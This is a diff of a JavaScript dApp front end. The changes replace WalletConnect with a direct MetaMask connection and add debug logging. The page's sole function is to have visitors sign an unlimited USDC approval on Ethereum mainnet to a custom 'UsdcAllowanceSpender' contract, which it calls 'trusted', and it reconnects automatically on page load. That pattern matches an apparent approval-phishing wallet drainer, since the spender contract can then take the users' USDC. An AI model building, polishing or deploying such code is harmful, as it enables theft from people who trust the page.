@@ -1,6 +1,6 @@
 // script.js
 // --- Configuration for Ethereum Mainnet ---
-const WALLETCONNECT_PROJECT_ID = '25a778da5292aee3e00da87e594c2005'; // Your WalletConnect Project ID
+const WALLETCONNECT_PROJECT_ID = '25a778da5292aee3e00da87e594c2005'; // Still here for context, but not used currently
 const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'; // Official Ethereum Mainnet USDC Address
 const SPENDER_CONTRACT_ADDRESS = '0xa81EE3A48c2B72C6AdB279812a730c93EfF5C2F6'; // Your Deployed UsdcAllowanceSpender Contract on Mainnet
 const FIXED_ALLOWANCE_AMOUNT_HEX = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // Unlimited allowance (MaxUint256)
@@ -10,9 +10,7 @@ const ERC20_ABI = [
     "function decimals() view returns (uint8)"
 ];
 
-let web3Modal; // WalletConnect Web3Modal instance
-let web3Provider; // The provider obtained from web3Modal
-let provider; // Ethers.js provider (ethers.providers.Web3Provider)
+let provider; // Ethers.js provider
 let signer;   // Ethers.js signer
 let connectedAccount; // Connected wallet address
 
@@ -63,11 +61,21 @@ function hideErrorDetails() {
 }
 
 function updateWalletInfo(address, network) {
+    console.log('DEBUG: Entering updateWalletInfo function.');
+    if (!approveButton) {
+        console.error('DEBUG: approveButton element not found!');
+        return; // Prevent further errors if button is missing
+    }
+
     accountAddress.textContent = address;
     networkName.textContent = network;
     walletInfo.classList.remove('hidden');
+    
     approveButton.classList.remove('hidden'); 
+    console.log('DEBUG: Removed hidden class from approveButton.');
+
     connectWalletButton.classList.add('hidden');
+    console.log('DEBUG: Added hidden class to connectWalletButton.');
 }
 
 function resetUI() {
@@ -77,97 +85,9 @@ function resetUI() {
     hideStatus();
     hideErrorDetails();
     updateMessage('Please connect your wallet to approve USDC.', 'info');
-    // Disconnect WalletConnect session if any
-    if (web3Modal && web3Modal.provider) {
-        web3Modal.provider.disconnect();
-    }
 }
 
-// --- WalletConnect V2 Initialization ---
-async function initWeb3Modal() {
-    try {
-        web3Modal = Web3ModalStandalone.Web3Modal.createClient({
-            projectId: WALLETCONNECT_PROJECT_ID,
-            metadata: {
-                name: 'USDC Approval DApp',
-                description: 'Approve USDC for a trusted contract.',
-                url: window.location.origin,
-                icons: ['https://example.com/icon.png'],
-            },
-            chains: [1], // Configure for Ethereum Mainnet
-            optionalChains: [11155111], // Sepolia for testing
-        });
-
-        // Subscribe to provider events
-        web3Modal.subscribeProvider(async (newProvider) => {
-            if (newProvider) {
-                console.log('Web3Modal provider changed/connected:', newProvider);
-                await handleProviderChange(newProvider);
-            }
-        });
-
-        // Check for an existing session on load
-        const currentProvider = await web3Modal.getWalletProvider();
-        if (currentProvider) {
-            console.log("Existing provider found from Web3Modal. Attempting to re-establish session.");
-            await handleProviderChange(currentProvider);
-        } else if (window.ethereum && window.ethereum.selectedAddress) {
-            // Fallback for injected provider (MetaMask) if Web3Modal didn't cache it
-            console.log("MetaMask selectedAddress found directly. Attempting to connect.");
-            await connectInjectedWallet();
-        } else {
-            updateMessage('Please connect your wallet to approve USDC.', 'info');
-        }
-
-    } catch (error) {
-        console.error('Error initializing Web3Modal:', error);
-        updateMessage('Error initializing DApp. Check console.', 'error');
-        displayErrorDetails(error);
-        hideLoader();
-    }
-}
-
-async function handleProviderChange(newProvider) {
-    web3Provider = newProvider;
-    try {
-        provider = new ethers.providers.Web3Provider(web3Provider);
-        signer = provider.getSigner();
-        connectedAccount = await signer.getAddress();
-        const network = await provider.getNetwork();
-
-        updateWalletInfo(connectedAccount, network.name);
-        updateMessage('Wallet connected. Ready to approve USDC.', 'success');
-        console.log('Wallet connected:', connectedAccount, 'on', network.name);
-
-        // Attach Ethers.js listeners to the WalletConnect provider
-        web3Provider.on('accountsChanged', handleAccountsChanged);
-        web3Provider.on('chainChanged', handleChainChanged);
-        web3Provider.on('disconnect', handleDisconnect);
-
-    } catch (error) {
-        console.error('Error handling provider change:', error);
-        updateMessage('Error processing wallet connection.', 'error');
-        displayErrorDetails(error);
-        resetUI();
-        hideLoader();
-    }
-}
-
-async function connectInjectedWallet() {
-    // This function is a fallback to handle MetaMask if Web3Modal doesn't pick it up directly on load
-    try {
-        if (typeof window.ethereum === 'undefined') {
-            throw new Error("MetaMask not detected.");
-        }
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
-        // If successful, Web3Modal should detect this change via subscribeProvider and call handleProviderChange
-    } catch (error) {
-        console.error('Direct MetaMask connection failed:', error);
-        // Do not resetUI here, let Web3Modal handle full connection flow
-    }
-}
-
-// --- Connect Wallet Function (using Web3Modal) ---
+// --- Wallet Connection (MetaMask/Injected Provider) ---
 async function connectWallet() {
     showLoader();
     updateMessage('Connecting to wallet...', 'info');
@@ -175,10 +95,31 @@ async function connectWallet() {
     hideErrorDetails();
 
     try {
-        const providerFromModal = await web3Modal.openModal();
-        // The handleProviderChange will be called via subscribeProvider when a wallet connects
+        if (typeof window.ethereum === 'undefined') {
+            throw new Error("MetaMask or other Web3 wallet not detected. Please install one.");
+        }
+
+        // Request account access
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+        // Ethers V5: use Web3Provider
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        signer = provider.getSigner();
+        connectedAccount = await signer.getAddress();
+        const network = await provider.getNetwork();
+
+        console.log('DEBUG: Wallet successfully connected in connectWallet. Calling updateWalletInfo...');
+        updateWalletInfo(connectedAccount, network.name);
+        updateMessage('Wallet connected. Ready to approve USDC.', 'success');
+        console.log('Wallet connected:', connectedAccount, 'on', network.name);
+
+        // Add listeners for account/chain changes
+        window.ethereum.on('accountsChanged', handleAccountsChanged);
+        window.ethereum.on('chainChanged', handleChainChanged);
+        window.ethereum.on('disconnect', handleDisconnect);
+
     } catch (error) {
-        console.error('Wallet connection failed (Web3Modal):', error);
+        console.error('Wallet connection failed:', error);
         updateMessage('Wallet connection cancelled or failed.', 'error');
         displayErrorDetails(error);
         resetUI();
@@ -194,14 +135,14 @@ function handleAccountsChanged(accounts) {
     } else {
         console.log('Accounts changed:', accounts[0]);
         // Re-initiate connection to update UI with new account
-        web3Modal.openModal(); // Re-open modal to trigger new connection flow
+        connectWallet(); 
     }
 }
 
 function handleChainChanged(chainId) {
     console.log('Chain changed:', chainId);
     // Re-initiate connection to update UI with new network
-    web3Modal.openModal(); // Re-open modal to trigger new connection flow
+    connectWallet(); 
 }
 
 function handleDisconnect(error) {
@@ -223,8 +164,10 @@ async function proposeApproveTransaction() {
     hideErrorDetails();
 
     try {
+        // Ethers V5: use ethers.Contract directly
         const usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
         
+        // Ethers V5: ethers.constants.MaxUint256
         const txResponse = await usdcContract.approve(
             SPENDER_CONTRACT_ADDRESS,
             ethers.constants.MaxUint256 // Unlimited allowance
@@ -252,6 +195,25 @@ approveButton.addEventListener('click', proposeApproveTransaction);
 
 // Initial check on load (for cached connections)
 window.addEventListener('load', async () => {
-    // Initialize Web3Modal first
-    await initWeb3Modal();
+    // Check if the connectWalletButton exists before adding event listener
+    if (connectWalletButton) {
+        console.log('DEBUG: connectWalletButton found.');
+    } else {
+        console.error('DEBUG: connectWalletButton not found!');
+    }
+
+    // Check if the approveButton exists before adding event listener
+    if (approveButton) {
+        console.log('DEBUG: approveButton found.');
+    } else {
+        console.error('DEBUG: approveButton not found!');
+    }
+
+    if (window.ethereum && window.ethereum.selectedAddress) {
+        // If MetaMask is already connected from a previous session, try to reconnect.
+        console.log("DEBUG: MetaMask selectedAddress found. Attempting to re-establish session.");
+        await connectWallet();
+    } else {
+        updateMessage('Please connect your wallet to approve USDC.', 'info');
+    }
 });
